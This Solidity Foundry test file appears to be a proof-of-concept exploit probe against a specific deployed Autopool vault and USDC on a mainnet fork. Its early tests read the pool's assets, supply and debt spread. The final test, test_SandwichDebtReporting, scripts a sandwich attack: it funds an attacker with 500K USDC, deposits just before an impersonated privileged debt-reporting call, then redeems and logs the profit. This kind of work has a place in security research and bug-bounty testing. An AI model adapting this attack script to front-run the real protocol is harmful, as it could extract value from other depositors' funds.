// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAutopool {
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function updateDebtReporting(uint256 numToProcess) external;
    function getAssetBreakdown() external view returns (
        uint256 totalIdle,
        uint256 totalDebt,
        uint256 totalDebtMin,
        uint256 totalDebtMax
    );
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
}

contract SimpleExploitTest is Test {
    address constant AUTOPOOL = 0xa7569A44f348d3D70d8ad5889e50F78E33d80D35;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant REPORTING_EXECUTOR = 0x1A65E4844a3AF0F1733ee9e1A474dc7DB3c396a3;

    function setUp() public {
        // Fork is created by forge test --fork-url
    }

    function test_BasicState() public view {
        console.log("=== Basic State Test ===");
        console.log("Block:", block.number);

        IAutopool pool = IAutopool(AUTOPOOL);

        // Direct call that worked in cast
        uint256 total = pool.totalAssets();
        console.log("Total Assets:", total);

        uint256 supply = pool.totalSupply();
        console.log("Total Supply:", supply);

        if (supply > 0) {
            uint256 nav = (total * 1e18) / supply;
            console.log("NAV per share:", nav);
        }
    }

    function test_AssetBreakdown() public view {
        console.log("\n=== Asset Breakdown Test ===");

        IAutopool pool = IAutopool(AUTOPOOL);

        (uint256 idle, uint256 debt, uint256 debtMin, uint256 debtMax) = pool.getAssetBreakdown();

        console.log("Total Idle (USDC):", idle / 1e6);
        console.log("Total Debt (USDC):", debt / 1e6);
        console.log("Debt Min (USDC):", debtMin / 1e6);
        console.log("Debt Max (USDC):", debtMax / 1e6);

        // Spread analysis
        uint256 spread = debtMax - debtMin;
        console.log("Debt Spread (USDC):", spread / 1e6);

        if (debtMax > 0) {
            uint256 spreadBps = (spread * 10000) / debtMax;
            console.log("Spread (bps):", spreadBps);
        }
    }

    function test_DebtReportingWithExecutor() public {
        console.log("\n=== Debt Reporting Test ===");

        IAutopool pool = IAutopool(AUTOPOOL);

        // Get state before
        (uint256 idleBefore, uint256 debtBefore, uint256 minBefore, uint256 maxBefore) = pool.getAssetBreakdown();
        uint256 assetsBefore = pool.totalAssets();

        console.log("BEFORE:");
        console.log("  Assets:", assetsBefore / 1e6, "USDC");
        console.log("  Debt Min:", minBefore / 1e6, "USDC");
        console.log("  Debt Max:", maxBefore / 1e6, "USDC");

        // Impersonate executor and update debt
        vm.prank(REPORTING_EXECUTOR);
        pool.updateDebtReporting(10);

        // Get state after
        (uint256 idleAfter, uint256 debtAfter, uint256 minAfter, uint256 maxAfter) = pool.getAssetBreakdown();
        uint256 assetsAfter = pool.totalAssets();

        console.log("\nAFTER:");
        console.log("  Assets:", assetsAfter / 1e6, "USDC");
        console.log("  Debt Min:", minAfter / 1e6, "USDC");
        console.log("  Debt Max:", maxAfter / 1e6, "USDC");

        // Check changes
        int256 assetDelta = int256(assetsAfter) - int256(assetsBefore);
        int256 minDelta = int256(minAfter) - int256(minBefore);
        int256 maxDelta = int256(maxAfter) - int256(maxBefore);

        console.log("\nDELTAS:");
        console.log("  Asset delta:", assetDelta);
        console.log("  Min delta:", minDelta);
        console.log("  Max delta:", maxDelta);
    }

    function test_DepositAndWithdraw() public {
        console.log("\n=== Deposit/Withdraw Test ===");

        IAutopool pool = IAutopool(AUTOPOOL);
        IERC20 usdc = IERC20(USDC);

        // Give ourselves USDC
        uint256 depositAmount = 100_000 * 1e6; // 100K USDC
        deal(USDC, address(this), depositAmount);

        console.log("Attacker USDC balance:", usdc.balanceOf(address(this)) / 1e6);

        // Approve and deposit
        usdc.approve(AUTOPOOL, depositAmount);

        uint256 sharesBefore = IERC20(AUTOPOOL).balanceOf(address(this));
        console.log("Shares before deposit:", sharesBefore);

        // Calculate expected shares
        uint256 expectedShares = pool.convertToShares(depositAmount);
        console.log("Expected shares:", expectedShares / 1e18);

        // Deposit
        uint256 sharesReceived = pool.deposit(depositAmount, address(this));
        console.log("Shares received:", sharesReceived / 1e18);

        // Check what we can redeem
        uint256 redeemableAssets = pool.convertToAssets(sharesReceived);
        console.log("Redeemable assets:", redeemableAssets / 1e6, "USDC");

        // Calculate immediate loss/gain
        if (redeemableAssets >= depositAmount) {
            console.log("Immediate gain:", (redeemableAssets - depositAmount) / 1e6, "USDC");
        } else {
            console.log("Immediate loss:", (depositAmount - redeemableAssets) / 1e6, "USDC");
        }
    }

    function test_SandwichDebtReporting() public {
        console.log("\n=== SANDWICH ATTACK SIMULATION ===");

        IAutopool pool = IAutopool(AUTOPOOL);
        IERC20 usdc = IERC20(USDC);

        // Give attacker USDC
        uint256 attackCapital = 500_000 * 1e6; // 500K USDC
        deal(USDC, address(this), attackCapital);

        console.log("Attack capital:", attackCapital / 1e6, "USDC");

        // ========== PRE-ATTACK STATE ==========
        console.log("\n--- PRE-ATTACK STATE ---");
        (uint256 idle0, uint256 debt0, uint256 min0, uint256 max0) = pool.getAssetBreakdown();
        uint256 nav0 = pool.totalAssets() * 1e18 / pool.totalSupply();
        console.log("NAV/share:", nav0);
        console.log("Debt spread:", (max0 - min0) / 1e6, "USDC");

        // ========== FRONT-RUN: DEPOSIT ==========
        console.log("\n--- FRONT-RUN: DEPOSIT ---");
        usdc.approve(AUTOPOOL, attackCapital);
        uint256 sharesFromDeposit = pool.deposit(attackCapital, address(this));
        console.log("Deposited:", attackCapital / 1e6, "USDC");
        console.log("Received shares:", sharesFromDeposit / 1e18);

        // ========== VICTIM TX: DEBT REPORTING ==========
        console.log("\n--- VICTIM TX: DEBT REPORTING ---");
        vm.prank(REPORTING_EXECUTOR);
        pool.updateDebtReporting(10);

        // Check if prices changed
        (uint256 idle1, uint256 debt1, uint256 min1, uint256 max1) = pool.getAssetBreakdown();
        uint256 nav1 = pool.totalAssets() * 1e18 / pool.totalSupply();
        console.log("NAV/share after:", nav1);
        console.log("NAV change:", int256(nav1) - int256(nav0));

        // ========== BACK-RUN: CHECK PROFIT ==========
        console.log("\n--- BACK-RUN: PROFIT CHECK ---");
        uint256 assetsRedeemable = pool.convertToAssets(sharesFromDeposit);
        console.log("Redeemable now:", assetsRedeemable / 1e6, "USDC");

        if (assetsRedeemable > attackCapital) {
            uint256 profit = assetsRedeemable - attackCapital;
            console.log("PROFIT:", profit / 1e6, "USDC");
            console.log("PROFIT %:", profit * 10000 / attackCapital, "bps");
        } else {
            uint256 loss = attackCapital - assetsRedeemable;
            console.log("LOSS:", loss / 1e6, "USDC");
        }

        // ========== ACTUALLY WITHDRAW ==========
        console.log("\n--- ACTUAL WITHDRAWAL ---");
        uint256 actualAssets = pool.redeem(sharesFromDeposit, address(this), address(this));
        console.log("Actually received:", actualAssets / 1e6, "USDC");

        uint256 finalBalance = usdc.balanceOf(address(this));
        console.log("Final USDC balance:", finalBalance / 1e6);

        if (finalBalance > attackCapital) {
            console.log("NET PROFIT:", (finalBalance - attackCapital) / 1e6, "USDC");
        } else {
            console.log("NET LOSS:", (attackCapital - finalBalance) / 1e6, "USDC");
        }
    }
}
